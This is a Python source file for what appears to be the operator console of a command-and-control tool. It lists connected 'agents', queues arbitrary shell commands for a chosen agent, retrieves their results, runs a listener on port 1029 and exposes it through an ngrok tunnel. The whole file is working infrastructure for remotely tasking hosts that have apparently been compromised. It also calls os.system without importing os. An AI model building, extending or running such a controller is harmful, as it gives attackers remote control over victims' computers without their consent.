#!/usr/bin/python3

from termcolor import colored as c
from libs.console import Autocomplete, start_shell
import libs.server as server
import libs.ngrok as ngrok
import config
from getpass import getpass
from uuid import uuid4
from subprocess import Popen, PIPE
import time, _thread

author = config.info()

class var(object):
        current_agent = None
var = var()

man = {
        'help':'Displays the help menu',
        'banner':'Prints the program\'s banner',
        'exit':'Exits the program',
        'man':'Find more information about a command. Usage: \'man help\'',
        'listAgents':'List active agents',
        'agent':'View/set active agent. Usage: \'agent marcu\'',
        'clear':'Clears the terminal window',
        '!':'Runs a command locally. Usage: \'! ls | grep rtc2\'',
        'cmd':'Assign a command to selected agent. Usage: \'cmd "whoami"\'',
        'startServer':'Starts the listener',
        'listTasks':'Show all tasks',
        'getResult':'Show result for specific task. Usage: \'getResult 102\'',
        }

def help_menu():
        built = ''
        for i in man:
                built += "\n%s : %s" % (i, c(man[i],"green"))
        return built

# Pretty colored messages
def error(msg): return "%s %s" % (c("[!]","red"),msg)
def info(msg): return "%s %s" % (c("[*]","cyan"),msg)
def fail(msg): return "[%s] : %s" % (c("FAILED","red"),msg)
def ok(msg): return "[  %s  ] : %s" % (c("OK","green"),msg)
def done(msg): return "[ %s ] : %s" % (c("DONE","green"),msg)

class Handler(object):
        commands = []
        for i in man:
                commands.append(i)
        def handle(self,cmd):
                try:
                        base = cmd.split(" ")[0]
                except:
                        base = cmd
                if base == "help":
                        print(help_menu())
                        return None
                elif base == "exit":
                        exit_sequence()
                        return "exit"
                elif base == "banner":
                        print_banner()
                        return None
                elif base == "man":
                        try:
                                obj = cmd.split(" ")[1]
                        except IndexError:
                                print(error("man: Requires one argument"))
                                obj = "man"
                        if not obj in man:
                                print(error("man: Command not found"))
                                return None
                        print("%s : %s" % (obj,c(man[obj],"green")))
                        return None
                elif base == "listAgents":
                        print("Agents:")
                        for i in server.agents:
                                print(c(i,"cyan"))
                        return None
                elif base == "agent":
                        try:
                                setagent = cmd.split(" ")[1]
                                var.current_agent = setagent
                                print(ok("Set agent as '%s'" % c(var.current_agent,"cyan")))
                                return None
                        except IndexError:
                                if var.current_agent == None:
                                        print(fail("No agent is set"))
                                        return None
                                print("Current agent is: '%s'" % c(var.current_agent,"cyan"))
                                return None
                elif base == "clear":
                        os.system("clear")
                        return None
                elif base == "!":
                        cmds = cmd.split(" ")
                        cmds.remove(cmds[0])
                        cmds = ' '.join(cmds)
                        os.system(cmds)
                        return None
                elif base == "cmd":
                        if var.current_agent is None:
                                print(error("Please select an agent first"))
                                return None
                        com = cmd.split('"')[1]
                        uid = str(uuid4())
                        server.commands.append({'agent':var.current_agent,'uid':uid,'cmd':com})
                        print(ok("Command added to tasklist"))
                        return None
                elif base == "startServer":
                        _thread.start_new_thread(server.serve, ( ))
                        print(ok("Server running at [0.0.0.0:1029]"))
                        return None
                elif base == "listTasks":
                        tsk = server.commands
                        print("Tasks:")
                        for i in tsk:
                                print("Agent: %s, cmd: %s, id: %s" % (c(i['agent'],"cyan"),c(i['cmd'],"cyan"),c(i['uid'],"cyan")))
                        return None
                elif base == "getResult":
                        try:
                                ID = cmd.split(" ")[1]
                        except IndexError:
                                print(error("You must specify the task ID"))
                                return None
                        tsk = server.commands
                        for i in tsk:
                                if i['uid'] == ID:
                                        if 'res' in i:
                                                print(i['res'])
                                        else:
                                                print("No result available")
                        return None
                else:
                        print(error("Command not found / Invalid syntax"))
                        return None


def print_banner():
        with open("libs/logo.txt","r") as btxt:
                logo = c(btxt.read(),"blue")
                name = author.name
                github = author.github
                print(logo + "\n\tAuthor: %s\n\tGithub: %s" % (
                        c(name,"green"),
                        c(github,"green")))



def do_ngrok():
        url = ngrok.run_ngrok()
        print(ok("Ngrok server url: "+str(url)))

def start_sequence():
        print_banner()
        #server.serve()
        files = Popen("find | grep ngrok",stdout=PIPE,shell=True).communicate()[0].decode()
        if len(files) == 0:
                ver = config.cfg().ver
                if ver == "64":
                        ngrok.download_64bit()
                elif ver == "32":
                        ngrok.download_32bit()
                elif ver == "arm":
                        ngrok.download_arm()
                else:
                        print(fail("Incorrect OS version in config.py, using 64bit"))
                        ngrok.download_64bit()
        #_thread.start_new_thread(do_ngrok, ( ))

def exit_sequence():
        ngrok.kill_ngrok()

def main():
        start_sequence() #add to
        start_shell(Handler())

if __name__ == "__main__":
        main()
